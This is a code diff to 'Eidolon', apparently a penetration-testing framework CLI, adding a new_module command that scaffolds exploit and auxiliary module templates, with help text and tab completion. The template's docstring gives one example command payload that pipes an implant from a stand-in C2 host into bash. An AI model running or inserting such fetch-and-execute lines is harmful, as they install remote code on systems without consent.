@@ -52,6 +52,76 @@ _TRUST_COLOR = {
     "unreadable": C.RED,
 }
 
+_NEW_MODULE_TEMPLATE = '''"""
+__NAME__ — Eidolon module (scaffolded by `new_module`)
+
+MODULE CONTRACT — the only two things the framework requires:
+  * OPTIONS   — dict of {KEY: {"value": default, "required": bool, "desc": str}}
+  * run(opts) — called by `run`; opts is {KEY: value} with the user-supplied values.
+                required options are validated automatically before run() fires.
+
+Optional metadata the CLI displays (delete what you do not need):
+  NAME, VERSION, DESCRIPTION, CATEGORY, MODULE_TYPE, AUTHOR, PAYLOAD_KIND
+  MODULE_TYPE: "auxiliary" | "generic" | "exploit"  (exploit modules get session logging)
+
+PAYLOAD CHANNELS (for exploit modules — pick what your bug provides):
+  * SHELLCODE_PATH — raw position-independent shellcode file. arch / badchars /
+                     max size are YOUR bug's constraints — validate them in run().
+  * PAYLOAD_FILE   — executable artifact dropped or uploaded on the target (exe/elf/so/dll).
+  * CMD            — shell command string (bash/zsh/cmd/...), e.g.
+                     "curl https://c2.example/implant | bash". You own the quoting/escaping.
+  * PAYLOAD_SRC    — source code executed by an interpreter on the target.
+The framework never touches payloads: you decide delivery, the operator decides content.
+
+INJECTED BY THE FRAMEWORK (available inside run):
+  * opts             — resolved option values
+  * EIDOLON_GLOBALS  — shared globals dict (see setg / globals)
+  * EIDOLON_SHELL    — the shell instance (internal API — use sparingly)
+  * __eidolon_path__ — this file's absolute path
+
+HOOKS: define on_load() to run code when the module is loaded (optional).
+"""
+
+from eidolon.utils import ok, err, info, warn, spectral
+
+NAME        = "__NAME__"
+VERSION     = "0.1.0"
+DESCRIPTION = "TODO: one-line description"
+CATEGORY    = "__CATEGORY__"
+MODULE_TYPE = "__TYPE__"          # auxiliary | generic | exploit
+AUTHOR      = "__AUTHOR__"
+
+# advertised in `info` (display only — the framework does not enforce it)
+# one of: shellcode | file | cmd | code | none
+PAYLOAD_KIND = "none"
+
+OPTIONS = {
+    # required options are validated automatically before run()
+    "target": {
+        "value":    "",
+        "required": True,
+        "desc":     "TODO: what this option means",
+    },
+    # example optional option — delete what you do not need
+    "verbose": {
+        "value":    False,
+        "required": False,
+        "desc":     "chatty output",
+    },
+}
+
+
+def run(opts):
+    target  = opts.get("target")
+    verbose = opts.get("verbose", False)
+
+    info(f"running __NAME__ against {target!r}")
+
+    # ---- your logic here ----
+
+    ok("__NAME__ finished")
+'''
+
 def _type_label(mod) -> str:
     t = _module_type(mod)
     return c(t, _TYPE_COLOR.get(t, "white"))
@@ -707,6 +777,63 @@ class Eidolon(cmd.Cmd):
         warn(f"inspect: {C.PINK}trusted --all{C.RESET}   trust: {C.PINK}trust <path>{C.RESET}")
         self.load_modules()
 
+    # ═══════════════════════════════════════════════════════════════════
+    # MODULE SCAFFOLDING (new_module)
+    # ═══════════════════════════════════════════════════════════════════
+    def do_new_module(self, arg):
+        """new_module <name> [dir] — Scaffold a guided module skeleton"""
+        args = arg.strip().split()
+        if not args:
+            return err("usage: new_module <name> [target_dir]")
+
+        raw_name = args[0].strip("/")
+        if not raw_name:
+            return err("module name cannot be empty")
+        parts = [p for p in raw_name.split("/") if p and p != "."]
+        if not parts or any(p == ".." for p in parts):
+            return err(f"invalid module name: {raw_name!r}")
+        for p in parts:
+            if not all(ch.isalnum() or ch in "_-" for ch in p):
+                return err(f"invalid characters in name (letters, digits, _ or - only): {raw_name!r}")
+
+        base    = parts[-1]
+        rel_key = "/".join(parts)
+
+        if len(args) > 1:
+            target_dir  = os.path.expanduser(args[1])
+            target_file = os.path.join(target_dir, base + ".py")
+            external    = True
+        else:
+            target_file = os.path.join(MODULES_DIR, rel_key + ".py")
+            external    = False
+
+        if os.path.exists(target_file):
+            return err(f"already exists: {target_file}")
+
+        category = parts[0] if len(parts) > 1 else "custom"
+        content = (_NEW_MODULE_TEMPLATE
+                   .replace("__NAME__", base)
+                   .replace("__CATEGORY__", category)
+                   .replace("__TYPE__", "generic")
+                   .replace("__AUTHOR__", self.operator_name))
+
+        try:
+            os.makedirs(os.path.dirname(target_file) or ".", exist_ok=True)
+            with open(target_file, "w", encoding="utf-8") as f:
+                f.write(content)
+        except OSError as e:
+            return err(f"cannot write module: {e}")
+
+        if not external:
+            self.trust_mgr.register_untrusted(rel_key, target_file, source="local")
+            ok(f"scaffolded {C.CYAN}{rel_key}{C.RESET} → {target_file}")
+            warn("module is UNTRUSTED (TOFU)")
+            info(f"edit it, then: {C.PINK}trust {rel_key}{C.RESET}  →  {C.PINK}use {rel_key}{C.RESET}  →  {C.PINK}run{C.RESET}")
+        else:
+            ok(f"scaffolded {C.CYAN}{base}{C.RESET} → {target_file}")
+            warn(f"outside the modules dir — it will NOT be auto-loaded; move it under {MODULES_DIR}")
+        self.load_modules()
+
     def do_add_module(self, arg):
         """add_module <src> [dest] [--force] — Install local module (TOFU: untrusted until trusted)"""
         return self._do_install_local(arg)
@@ -772,6 +899,7 @@ class Eidolon(cmd.Cmd):
         print(f"  {C.PINK}── REPO ──{C.RESET}")
         print(f"  {C.CYAN}repo{C.RESET} <list|add|remove|enable|disable|priority|sync|search|list-modules|stats|check|install|upgrade|update-all|source|info>")
         print(f"  {C.PINK}── LOCAL ──{C.RESET}")
+        print(f"  {C.CYAN}new_module{C.RESET} <name> [dir]      — scaffold a guided module skeleton")
         print(f"  {C.CYAN}add_module{C.RESET} <src> [dest] [--force]")
         print(f"  {C.CYAN}install_local{C.RESET} <src> [dest] [--force]")
         print(f"  {C.CYAN}remove{C.RESET} <name> / {C.CYAN}setg{C.RESET} <k> <v> / {C.CYAN}globals{C.RESET}\n")
@@ -1057,6 +1185,50 @@ class Eidolon(cmd.Cmd):
     # ═════════════════════════════════════════════════════════
     # TAB COMPLETION
     # ═════════════════════════════════════════════════════════
+    def complete_new_module(self, text, line, begidx, endidx):
+        parts = line.split()
+        in_first = (len(parts) == 1) or (len(parts) == 2 and not line.endswith(" "))
+        if in_first:
+            # completing the module name: existing category dirs under MODULES_DIR
+            prefix   = text
+            sub_path = ""
+            if "/" in prefix:
+                sub_path, _, sub = prefix.rpartition("/")
+                sub_path = sub_path.strip("/")
+                sub = text.rpartition("/")[2]
+            else:
+                sub = prefix
+            base_dir = os.path.join(MODULES_DIR, sub_path) if sub_path else MODULES_DIR
+            try:
+                entries = os.listdir(base_dir)
+            except OSError:
+                return []
+            results = []
+            for e in sorted(entries):
+                if e.startswith((".", "_", "@")):
+                    continue
+                full = os.path.join(base_dir, e)
+                if os.path.isdir(full) and e.startswith(sub):
+                    results.append((sub_path + "/" if sub_path else "") + e + "/")
+            return results
+        # completing the optional target dir: filesystem directories
+        clean_text = text.strip("'\"")
+        expanded   = os.path.expanduser(clean_text) if clean_text else ""
+        matches    = glob.glob(expanded + "*") if expanded else []
+        results    = []
+        for match in matches:
+            if not os.path.isdir(match):
+                continue
+            display = match
+            if clean_text.startswith("~") and not display.startswith("~"):
+                home = os.path.expanduser("~")
+                if display.startswith(home):
+                    display = "~" + display[len(home):]
+            if not display.endswith("/"):
+                display += "/"
+            results.append(display)
+        return results
+
     def complete_add_module(self, text, line, begidx, endidx):
         clean_text = text.strip("'\"")
         expanded_text = os.path.expanduser(clean_text)
@@ -1119,7 +1291,7 @@ class Eidolon(cmd.Cmd):
     def complete_operator(self, text, *_): return [x for x in ["name", "team"] if x.startswith(text)]
     def complete_help(self, text, *_):
         cmds = ["help","banner","clear","reload","exit","modules","search","info","use","back",
-                "options","set","unset","run","sessions","add_module","install_local","remove",
+                "options","set","unset","run","sessions","new_module","add_module","install_local","remove",
                 "uninstall","setg","globals","status","whoami","operator","repo",
                 "trust","untrust","trusted","verify"]
         return [x for x in cmds if x.startswith(text)]
